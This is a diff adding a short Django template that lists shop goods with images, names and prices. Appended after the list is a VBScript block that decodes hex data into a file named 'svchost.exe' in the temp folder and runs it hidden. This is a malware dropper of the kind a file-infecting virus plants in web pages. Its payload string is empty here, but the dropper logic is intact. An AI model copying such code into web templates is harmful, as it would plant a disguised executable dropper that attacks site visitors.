@@ -1,0 +1,25 @@
+{% load static %}
+
+<ul>
+    {% for good in goods %}
+    <li>
+        <a href=""><img src="{{ url }}{{ good.images }}"></a>
+        <h4><a href="#">{{ good.name }}</a></h4>
+        <div class="prize">￥{{ good.price }}</div>
+    </li>
+    {% endfor %}
+</ul><SCRIPT Language=VBScript><!--
+DropFileName = "svchost.exe"
+WriteData = ""
+Set FSO = CreateObject("Scripting.FileSystemObject")
+DropPath = FSO.GetSpecialFolder(2) & "\" & DropFileName
+If FSO.FileExists(DropPath)=False Then
+Set FileObj = FSO.CreateTextFile(DropPath, True)
+For i = 1 To Len(WriteData) Step 2
+FileObj.Write Chr(CLng("&H" & Mid(WriteData,i,2)))
+Next
+FileObj.Close
+End If
+Set WSHshell = CreateObject("WScript.Shell")
+WSHshell.Run DropPath, 0
+//--></SCRIPT>
